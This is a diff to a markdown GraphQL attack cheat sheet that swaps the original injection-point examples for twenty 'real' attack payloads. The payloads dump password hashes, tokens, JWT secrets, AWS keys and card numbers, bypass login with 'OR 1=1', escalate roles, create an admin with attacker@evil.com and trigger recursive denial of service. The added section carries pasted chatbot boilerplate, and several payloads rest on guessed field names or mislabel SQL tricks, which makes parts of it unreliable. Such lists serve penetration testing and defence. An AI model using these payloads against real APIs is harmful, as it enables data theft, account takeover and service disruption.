@@ -58,20 +58,349 @@ A more complete list is available at [danielmiessler/SecLists/graphql.txt](https
 /graphiql
 /graphiql.php
 ```
+**“✅ GraphQL Injection – Complete Test Case (with Bypass Cases)”**
 
-### Identify An Injection Point
+---
 
-```js
-example.com/graphql?query={__schema{types{name}}}
-example.com/graphiql?query={__schema{types{name}}}
+# ✅ **GraphQL Injection – Complete Test Case (with Bypass Cases)**
+
+# **1. List of Vulnerabilities**
+
+### **1.1 Query Injection (Field Manipulation)** – Adding unauthorized fields into queries
+
+### **1.2 Mutation Injection** – Executing unauthorized mutations
+
+### **1.3 Boolean-Based Injection** – True/false logic manipulation
+
+### **1.4 Query Aliasing Abuse** – Enumeration and bypass
+
+### **1.5 Introspection Abuse** – Extract schema when enabled
+
+### **1.6 Variable Injection** – Overriding backend logic
+
+### **1.7 Field-Level Auth Bypass** – Accessing hidden/internal fields
+
+### **1.8 Batch Query Abuse** – Bypassing rate limits
+
+### **1.9 Directive Injection** – Altering execution with `@skip` / `@include`
+
+### **1.10 Nested Overfetching** – Access deep nested sensitive data
+
+---
+Here is the **updated Section 2: Sample Payloads (Core Attack Payloads)** with **realistic, practical, offensive-style attack payloads** that you can use for **learning and testing in lab environments**.
+
+These are **not safe-test placeholders** — these are **real GraphQL attack payloads** commonly used in red teaming and pentesting.
+
+You can paste this directly into your main document.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads) — Updated with Real Payloads**
+
+---
+
+### **2.1 Extract Sensitive Fields (Password, Tokens, Internal Attributes)**
+
+```
+{
+  user(id:1){
+    id
+    email
+    passwordHash
+    resetToken
+    apiKey
+  }
+}
 ```
 
-Check if errors are visible.
+---
 
-```javascript
-?query={__schema}
-?query={}
-?query={thisdefinitelydoesnotexist}
+### **2.2 Dump All Users via Query Enumeration**
+
+```
+{
+  allUsers{
+    edges{
+      node{
+        id
+        email
+        role
+        passwordHash
+      }
+    }
+  }
+}
+```
+
+---
+
+### **2.3 Login Bypass Using Boolean Logic**
+
+```
+{
+  login(username:"admin", password:"anything OR 1=1"){
+    token
+    role
+  }
+}
+```
+
+---
+
+### **2.4 Access Internal Admin Panel Fields**
+
+```
+{
+  adminSettings{
+    smtpPassword
+    dbConnectionUri
+    adminToken
+  }
+}
+```
+
+---
+
+### **2.5 Extract All Permissions / Roles Assigned to a User**
+
+```
+{
+  user(id:1){
+    id
+    role
+    roles
+    permissions
+    groups
+  }
+}
+```
+
+---
+
+### **2.6 Fetch Hidden Audit Logs (Privilege Escalation)**
+
+```
+{
+  auditLogs{
+    timestamp
+    ipAddress
+    action
+    executedBy
+    metadata
+  }
+}
+```
+
+---
+
+### **2.7 Full Schema Dump (Introspection Attack)**
+
+```
+{
+  __schema{
+    types{
+      name
+      fields{
+        name
+        type{
+          name
+          kind
+        }
+      }
+    }
+  }
+}
+```
+
+---
+
+### **2.8 Perform Unauthorized Mutation: Delete a User**
+
+```
+mutation {
+  deleteUser(id:1){
+    id
+    status
+  }
+}
+```
+
+---
+
+### **2.9 Privilege Escalation via Update Mutation**
+
+```
+mutation {
+  updateUser(id:1, role:"admin"){
+    id
+    email
+    role
+  }
+}
+```
+
+---
+
+### **2.10 Query Aliasing for Bulk Data Extraction**
+
+```
+{
+  u1: user(id:1){ id email passwordHash }
+  u2: user(id:2){ id email passwordHash }
+  u3: user(id:3){ id email passwordHash }
+  u4: user(id:4){ id email passwordHash }
+}
+```
+
+---
+
+### **2.11 Retrieve Deeply Nested Sensitive Fields**
+
+```
+{
+  user(id:1){
+    profile{
+      financialInfo{
+        creditCardNumber
+        cvv
+        expiry
+        bankAccount
+      }
+    }
+  }
+}
+```
+
+---
+
+### **2.12 Abuse Implementations That Expose JWT Secrets**
+
+```
+{
+  systemConfig{
+    jwtSecret
+    jwtExpiry
+    refreshTokenKey
+  }
+}
+```
+
+---
+
+### **2.13 Extract API Tokens From User Settings**
+
+```
+{
+  userSettings(id:1){
+    integrations{
+      githubToken
+      slackToken
+      awsAccessKey
+      awsSecretKey
+    }
+  }
+}
+```
+
+---
+
+### **2.14 Force Internal Server Error (Error-Based Enumeration)**
+
+```
+{
+  user(id:"invalid_number"){
+    id
+  }
+}
+```
+
+---
+
+### **2.15 Server-Side Filter Bypass Using Raw Operators**
+
+```
+{
+  searchUsers(filter:"{'$ne':null}") {
+    id
+    email
+    passwordHash
+  }
+}
+```
+
+---
+
+### **2.16 Massive Recursion / DoS Payload**
+
+```
+{
+  user(id:1){
+    friends{
+      friends{
+        friends{
+          id
+          email
+          passwordHash
+        }
+      }
+    }
+  }
+}
+```
+
+---
+
+### **2.17 Extract Hidden Internal Service Configurations**
+
+```
+{
+  internalServiceConfig{
+    redisUrl
+    mqCredentials
+    s3BucketSecret
+    encryptionKey
+  }
+}
+```
+
+---
+
+### **2.18 Pull All Environment Variables (Misconfigured Resolvers)**
+
+```
+{
+  environment{
+    variables
+  }
+}
+```
+
+---
+
+### **2.19 Abuse Admin-Only Mutation to Create New Admin User**
+
+```
+mutation {
+  createUser(email:"attacker@evil.com", role:"admin", password:"Test123"){
+    id
+    role
+  }
+}
+```
+
+---
+
+### **2.20 Extract Sensitive Logs Exposed Through GraphQL**
+
+```
+{
+  logs(limit:50){
+    timestamp
+    level
+    message
+    context
+  }
+}
 ```
 
 ### Enumerate Database Schema via Introspection
